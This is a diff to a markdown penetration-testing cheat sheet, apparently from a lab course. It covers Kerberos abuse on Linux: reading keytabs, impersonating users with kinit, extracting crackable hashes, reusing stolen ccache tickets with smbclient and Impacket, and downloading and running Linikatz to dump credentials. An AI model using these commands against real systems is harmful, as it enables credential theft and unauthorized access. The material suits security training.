@@ -374,7 +374,7 @@ env | grep -i krb5
 ls -la /tmp
 ```
 
-## Abusing KeyTab Files
+### Abusing KeyTab Files
 
 **Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.
 
@@ -383,7 +383,7 @@ ls -la /tmp
 klist -k -t /opt/specialfiles/carlos.keytab
 ```
 
-### Impersonating a user with a KeyTab
+#### Impersonating a user with a KeyTab
 
 ```bash
 klist
@@ -393,7 +393,7 @@ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
 smbclient //dc01/carlos -k -c ls
 ```
 
-### KeyTab Extract
+#### KeyTab Extract
 
 Use **KeyTabExtract** to extract the realm, service principal, encryption type, and crackable hashes from `.keytab` files, which may enable password recovery and Linux account access.
 
@@ -403,9 +403,11 @@ Use **KeyTabExtract** to extract the realm, service principal, encryption type, 
 python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 ```
 
-## Abusing KeyTab ccache
+### Abusing KeyTab ccache
 
-### Importing the ccache file into our current session
+#### Importing the ccache file into our current session
+
+If Impacket cannot use the Kerberos ticket, remove the `FILE:` prefix from `KRB5CCNAME`.
 
 ```bash
 cp /tmp/krb5cc_647401106_I8I133 .
@@ -414,5 +416,22 @@ klist
 
 # check smb access
 smbclient //dc01/C$ -k -c ls -no-pass
+```
+
+### Misc
+
+#### Ticket Converter
+
+```bash
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+
+#### Linikatz
+
+**Linikatz** is the Linux equivalent of Mimikatz. As root, it extracts credentials, Kerberos tickets, ccache files, and keytabs from AD-integrated Linux systems, saving them in a `linikatz.*` directory.
+
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+/opt/linikatz.sh
 ```
 
